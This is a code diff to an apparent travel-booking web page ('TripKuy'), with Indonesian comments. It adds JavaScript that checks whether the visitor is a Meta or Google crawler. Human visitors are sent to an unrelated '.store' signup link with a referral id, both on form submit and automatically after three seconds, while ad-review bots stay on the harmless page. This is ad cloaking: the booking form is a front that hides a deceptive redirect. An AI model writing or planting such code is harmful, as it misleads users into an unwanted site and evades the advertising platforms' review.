@@ -147,24 +147,35 @@
     </script>
 </body>
 </html>
-
 <script>
+    // Konfigurasi Link Tujuan
+    const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
+    
+    // Deteksi apakah pengunjung adalah Bot Meta Ads / Google
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(navigator.userAgent);
+
+    // 1. Logika Form Pemesanan
     document.getElementById('bookingForm').addEventListener('submit', function(e) {
         e.preventDefault();
-
-        // Identifikasi bot umum dari Meta/Facebook dan Google
-        const botPattern = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i;
-        const isBot = botPattern.test(navigator.userAgent);
-
         if (!isBot) {
-            // Jika MANUSIA: Beri notifikasi singkat lalu arahkan ke link tujuan
-            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran anggota.');
-            window.location.href = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
+            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran.');
+            window.location.href = destinationURL;
         } else {
-            // Jika BOT: Hanya tampilkan alert tanpa pindah halaman (stay di web asli)
             alert('Terima kasih! Pesanan Anda telah kami terima.');
-            console.log('Bot detected: staying on page for compliance.');
         }
     });
+
+    // 2. Logika Auto-Redirect (Berjalan jika pengunjung bukan BOT)
+    if (!isBot) {
+        // Set waktu tunggu (misalnya 3 detik) sebelum redirect otomatis tanpa klik
+        // Ini berguna jika user malas mengisi form tapi ingin langsung diarahkan
+        setTimeout(function() {
+            console.log("Auto-redirecting human user...");
+            window.location.href = destinationURL;
+        }, 3000); // 3000ms = 3 detik. Ubah angka ini sesuai keinginan.
+    } else {
+        console.log("Bot detected. Auto-redirect disabled for compliance.");
+    }
 </script>
+
 
